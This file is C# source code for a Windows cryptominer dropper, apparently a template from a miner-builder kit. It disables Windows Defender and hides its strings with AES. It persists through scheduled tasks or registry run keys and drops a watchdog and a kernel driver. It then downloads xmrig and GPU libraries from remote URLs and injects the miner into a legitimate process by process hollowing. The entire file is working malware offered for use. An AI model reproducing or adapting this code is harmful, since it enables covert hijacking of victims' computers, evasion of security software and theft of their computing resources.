using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

public partial class RProgram
{
    public static void Main()
    {
        try
        {
#if DefKillWD
            try
            {
                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"));
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
            }
#endif

#if DefSystem32
            string _rbD_ = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + _rGetString_("#LIBSPATH"));
#else
            string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
#endif
#if DefInstall
            try{
                string _rplp_ = PayloadPath;
#if DefShellcode
                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
#else
                string _rcmdl_ = Assembly.GetExecutingAssembly().Location;
#endif
                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                {
                    _rKillWatchdog_();

                    try
                    {
                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
                    } 
                    catch {}

                    try
                    {
                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"));
                    } 
                    catch {}

                    try{
                        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            try{
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCH"), _rplp_));
                            }
                            catch(Exception ex){
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
#if DefDebug
                                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                            }
                        }else{
                            _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                        }
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("M1.5: " + ex.ToString());
#endif
                    }

                    Thread.Sleep(10000);
                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                    File.WriteAllBytes(_rplp_, File.ReadAllBytes(_rcmdl_));
                    Thread.Sleep(2 * 1000);
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                    Environment.Exit(0);
                }
            }
            catch(Exception ex){
#if DefDebug
                MessageBox.Show("M2: " + ex.ToString());
#endif
            }
#endif

            try
            {
                try
                {
                    Directory.CreateDirectory(_rbD_);
#if DefWatchdog
                    if (Process.GetProcessesByName(_rGetString_("#WATCHDOG")).Length < 1)
                    {
                        _rKillWatchdog_();

                        File.WriteAllBytes(_rbD_ + _rGetString_("#WATCHDOG") + ".exe", _rGetTheResource_("#watchdog"));

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".exe"),
                            WorkingDirectory = _rbD_,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }
#endif
                    File.WriteAllBytes(Path.Combine(_rbD_, "WR64.sys"), _rGetTheResource_("#winring"));
                }
                catch (Exception ex)
                {
#if DefDebug
                    MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
                }

                string _rs_ = "";

                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;

                var _rarg1_ = new ConnectionOptions();
                _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
                var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
                _rarg2_.Connect();

                var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), _rGetString_("#InjectionTarget")))).Get();
                foreach (ManagementObject MemObj in _rarg3_)
                {
                    if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
                    {
                            Environment.Exit(0);
                    }
                }

#if DefGPU
                try
                {
                    string _rarg7_ = _rGetGPU_();
                    if (_rarg7_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        try
                        {
                            byte[] li = {};
#if DefDownloader
                            if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log")))
                            {
                                using (var client = new System.Net.WebClient())
                                {
                                    try {
                                        li = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMLIBSURL")));
                                    }
                                    catch(Exception ex){
#if DefDebug
                                        MessageBox.Show("M5.5: Couldn't get libs from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
#endif
                                    }
                                    if (li.Length == 0) {
                                        li = client.DownloadData(_rGetString_("#LIBSURL"));
                                    }
                                }
#if DefInstall
                                if (li.Length > 0) {
                                    File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"), _rAESMethod_(li, true));
                                }
#endif
                            }
                            else
                            {
                                li = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log")));
                            }
#else
                            li = _rGetTheResource_("#libs");
#endif
                            if (li.Length > 0) {
                                using (var _rarchive_ = new ZipArchive(new MemoryStream(li)))
                                {
                                    foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                        _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
                                    }
                                }

                                if (_rarg7_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    _rs_ += " --cuda --cuda-loader=" + "\"" + _rbD_ + "ddb64.dll" + "\"";
                                }

                                if (_rarg7_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    _rs_ += " --opencl ";
                                }
                            }
                        }
                        catch(Exception ex){
#if DefDebug
                            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
                        }
                    }
                }
                catch(Exception ex){
#if DefDebug
                    MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
                }
#endif
                byte[] _rxm_ = { };

#if DefDownloader
                try
                {
                    if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")))
                    {
                        using (var client = new System.Net.WebClient())
                        {
                            try
                            {
                                _rxm_ = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMMINERURL")));
                            }
                            catch(Exception ex){
#if DefDebug
                                MessageBox.Show("M6.5: Couldn't get xmrig from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
#endif
                            }
                            if (_rxm_.Length == 0) {
                                _rxm_ = client.DownloadData(_rGetString_("#MINERURL"));
                            }
                        }
#if DefInstall
                        if (_rxm_.Length > 0) {
                            File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"), _rAESMethod_(_rxm_, true));
                        }
#endif
                    }
                    else
                    {
                        _rxm_ = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")));
                    }
                }
                catch(Exception ex){
#if DefDebug
                    MessageBox.Show("MCDL: " + Environment.NewLine + ex.ToString());
#endif
                }
#else
                _rxm_ = _rGetTheResource_("#xmr");
#endif
                try
                {
                    if (_rxm_.Length > 0)
                    {
                        using (var _rarchive_ = new ZipArchive(new MemoryStream(_rxm_)))
                        {
                            foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                            {
                                if (_rentry_.FullName.Contains("ri"))
                                {
                                    using (var _rstreamdata_ = _rentry_.Open())
                                    {
                                        using (var _rms_ = new MemoryStream())
                                        {
                                            _rstreamdata_.CopyTo(_rms_);
                                            _rRun_(_rms_.ToArray(), ("#InjectionDir") + @"\" + _rGetString_("#InjectionTarget"), _rGetString_("#ARGSTR") + _rs_);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
#if DefDebug
                    MessageBox.Show("M7: " + Environment.NewLine + ex.ToString());
#endif
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M8: " + Environment.NewLine + ex.ToString());
#endif
            }
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0: " + Environment.NewLine + ex.ToString());
#endif
        }
        Environment.Exit(0);
    }

    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

#if DefGPU
    public static string _rGetGPU_()
    {
        try
        {
            string _rarg7_ = "";

            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
            _rarg5_.Connect();

            var _rarg6_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
            foreach (ManagementObject MemObj in _rarg6_)
            {
                _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
            }

            return _rarg7_;
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("9: " + Environment.NewLine + ex.ToString());
#endif
        }
        return "";
    }
#endif

    public static void _rKillWatchdog_()
    {
#if DefWatchdog
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
            {
                proc.Kill();
            }

            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains("/" + _rGetString_("#WATCHDOG")))
                {
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }
            return _rarg7_.ToArray();
        }
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string _rarg1_,
                                                 string _rarg2_,
                                                 IntPtr _rarg3_,
                                                 IntPtr _rarg4_,
                                                 bool _rarg5_,
                                                 uint _rarg6_,
                                                 IntPtr _rarg7_,
                                                 string _rarg8_,
                                                 byte[] _rarg9_,
                                                 byte[] _rarg1_0);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long _rarg1_,
                                              long _rarg2_,
                                              long _rarg3_,
                                              uint _rarg4_,
                                              uint _rarg5_);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long _rarg1_,
                                                  long _rarg2_,
                                                  byte[] _rarg3_,
                                                  int _rarg4_,
                                                  long _rarg5_);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long _rarg1_,
                                                    long _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long _rarg1_);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long _rarg1_);

    public static void _rRun_(byte[] _rarg1_, string _rarg2_, string _rarg3_)
    {
        int _rarg4_ = Marshal.ReadInt32(_rarg1_, 0x3c);

        long _rarg5_ = Marshal.ReadInt64(_rarg1_, _rarg4_ + 0x18 + 0x18);

        byte[] _rarg6_ = new byte[0x18];

        IntPtr _rarg7_ = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

        Marshal.WriteInt32(_rarg7_, 0x30, 0x0010001b);

        CreateProcess(null, _rarg2_ + (!string.IsNullOrEmpty(_rarg3_) ? " " + _rarg3_ : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(_rarg2_), new byte[0x68], _rarg6_);
        long _rarg8_ = Marshal.ReadInt64(_rarg6_, 0x0);
        long _rarg9_ = Marshal.ReadInt64(_rarg6_, 0x8);

        ZwUnmapViewOfSection(_rarg8_, _rarg5_);
        VirtualAllocEx(_rarg8_, _rarg5_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x038), 0x3000, 0x40);
        WriteProcessMemory(_rarg8_, _rarg5_, _rarg1_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x03c), 0L);

        for (short i = 0; i < Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x2); i++)
        {
            byte[] _rarg1_0 = new byte[0x28];
            Buffer.BlockCopy(_rarg1_, _rarg4_ + (0x18 + Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x10)) + (0x28 * i), _rarg1_0, 0, 0x28);

            byte[] _rarg1_1 = new byte[Marshal.ReadInt32(_rarg1_0, 0x010)];
            Buffer.BlockCopy(_rarg1_, Marshal.ReadInt32(_rarg1_0, 0x014), _rarg1_1, 0, _rarg1_1.Length);

            WriteProcessMemory(_rarg8_, _rarg5_ + Marshal.ReadInt32(_rarg1_0, 0x00c), _rarg1_1, _rarg1_1.Length, 0L);
        }

        GetThreadContext(_rarg9_, _rarg7_);

        WriteProcessMemory(_rarg8_, Marshal.ReadInt64(_rarg7_, 0x88) + 16, BitConverter.GetBytes(_rarg5_), 8, 0L);

        Marshal.WriteInt64(_rarg7_, 0x80, _rarg5_ + Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x10));

        SetThreadContext(_rarg9_, _rarg7_);
        ResumeThread(_rarg9_);

        Marshal.FreeHGlobal(_rarg7_);
        CloseHandle(_rarg8_);
        CloseHandle(_rarg9_);
    }
}